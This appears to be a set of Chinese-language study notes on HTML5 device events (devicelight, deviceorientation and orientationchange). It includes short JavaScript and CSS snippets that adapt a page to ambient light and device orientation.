devicelight    设备屏幕亮度变化事件 [HTML5] 
  PS:移动设备的亮度传感器感知外部亮度发生显著变化时触发;目前,只有Firefox部署了该API
  var DLRun = function(event) { }
  window.addEventListener('devicelight',DLRun);
  event.value  亮度的流明值
  Example:  若亮度变强,网页显示黑底白字,若亮度变弱,网页显示白底黑字
    window.addEventListener('devicelight', function(e) {
      var lux = e.value;
      if(lux < 50) {
        document.body.className = 'dim';
      }
      if(lux >= 50 && lux <= 1000) {
        document.body.className = 'normal';
      }
      if(lux > 1000)  {
        document.body.className = 'bright';
      } 
    });
    CSS下一个版本的Media Query可以单独设置亮度,一旦浏览器支持,就可以用来取代Luminosity API.
    @media (light-level: dim) { /* 暗光环境 */ }
    @media (light-level: normal) { /* 正常光环境 */ }
    @media (light-level: washed) { /* 明亮环境 */ }
deviceorientation  设备摆放方向[竖放或横放]变化事件[HTML5] 
  PS:一旦设备的方向发生变化触发
  检测浏览器是否支持该API
    if (window.DeviceOrientationEvent) { /*  支持 */ } 
    else { /* 不支持 */ }
  window.addEventListener("deviceorientation", DORun);
  function DORun(event){ }
  event 
    PS:分别对应手机摆放的三维倾角变化.要理解它们,就要理解手机的方向模型.
      当手机水平摆放时,使用三个轴标示它的空间位置:x轴代表横轴、y轴代表竖轴、z轴代表垂直轴.
      event对象的三个属性就对应这三根轴的旋转角度.
    event.alpha  表示围绕z轴的旋转,从0到360度.      设备水平摆放时,alpha为0
    event.beta   表示围绕x轴的旋转,从-180 度到180度 设备水平摆放时,beta为0
    event.gamma 表示围绕y轴的选择,从-90 到90度      设备水平摆放时,gramma为0
orientationchange  在屏幕发生翻转时触发[HTML5] 
  window.orientation 设备的方向,0 表示竖直;90 表示右旋;-90 表示 左旋;
